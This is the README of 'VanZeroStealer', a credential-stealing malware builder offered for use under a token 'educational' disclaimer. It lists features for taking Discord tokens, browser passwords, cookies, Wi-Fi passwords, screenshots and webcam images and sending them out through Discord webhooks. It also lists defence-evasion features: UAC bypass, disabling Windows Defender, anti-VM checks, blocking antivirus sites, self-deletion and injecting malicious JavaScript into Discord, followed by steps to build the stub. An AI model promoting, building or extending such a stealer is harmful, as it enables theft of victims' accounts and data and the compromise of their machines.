<h1 align="center">
   VanZeroStealer
</h1>



**Disclaimer:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!

**Note:** If you didn't get any result while testing the grabber on yourself, you may try to turn off VMPROTECT as the grabber might have detected your system as a virtual machine.

## Features
    • GUI Builder.
    • UAC Bypass.
    • Runs On Startup.
    • Disables Windows Defender.
    • Anti-VM.
    • Blocks AV-Related Sites
    • Hides/Deletes Itself.
    • Custom Message Box.
    • EXE Binder.
    • Better Obfuscation.
    • Anti Unpacking Technique (Removed due to bugs).
    • Anti UPX-Detection by YARA (Removed due to bugs).
    • Anti Pyinstaller-Detection by YARA (Removed due to bugs).
    • Grabs Discord Tokens.
    • Injects javascript in Discord client's files.
    • Grabs Passwords from many browsers (Internet Explorer, Mozilla Firefox, Google Chrome, Safari, and Opera.).
    • Grabs Chrome Cookies (Netscape format, Importable).
    • Grabs Chrome History.
    • Grabs Minecraft Session.
    • Grabs Roblox Cookies.
    • Grabs IP Information.
    • Grabs System Info.
    • Grabs Saved Wifi Passwords.
    • Captures Screenshot.
    • Captures Webcam Image (Buggy).
    • Sends All Data Through Discord Webhooks.
    (...more)

## Togglable Options
| Option | Description |
| ------ | ----------- |
| **Ping Me** | Pings [@everyone]
| **VM Protect** | Tries its best to prevent running in Virtual Machine. |
| **BSOD** | Triggers Blue Screen of Death when ran on Virtual Machine. |
| **Startup** | Runs the stub on Windows starup. |
| **Delete Self** | Deletes the grabber after use. |
| **Discord Injection** | Adds malicious Javascript code to the Discord client for persistence. |
| **Block AV Sites** | Blocks AV related sites
| **Message Box** | Create custom message box. |

**Supports:** *Windows OS (Tested on Windows 10).*

## Requirements
**To build the stub, you need:**
- Windows 10.
- Python 3.9+.
- An active internet connection.

## How to Build?
*If you literally have no idea how to build it.*

1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
4. Navigate to the **VanZeroStealer** folder and double click *Builder.bat* file.
6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.

## To-Do/Enhancements
- [x] Grab saved WIFI passwords.
- [x] Icon selector for stub.
- [x] Message Box.
- [x] EXE Binder.
- [x] Remove some features because they cause bugs.
- [x] Discord JS Injection.
- [x] Importable Cookies.
- [x] Block AV Related Sites.
